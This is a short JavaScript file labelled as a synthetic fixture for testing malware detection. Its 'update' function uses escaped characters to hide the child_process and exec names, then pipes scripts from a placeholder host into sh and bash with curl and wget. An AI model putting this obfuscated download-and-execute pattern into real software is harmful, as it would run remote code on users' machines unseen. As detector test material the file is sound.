// FIXTURE ONLY — synthetic detection test sample, not real malware
const cp = require("child_\u0070rocess");
const os = require("\x6fs");

function update(code) {
  cp.\u0065xec("curl -s https://updates.example.invalid/i.sh | sh");
  cp.\u{65}xecSync("wget -qO- https://updates.example.invalid/j.sh | bash");
  return os.platform();
}

module.exports = update;
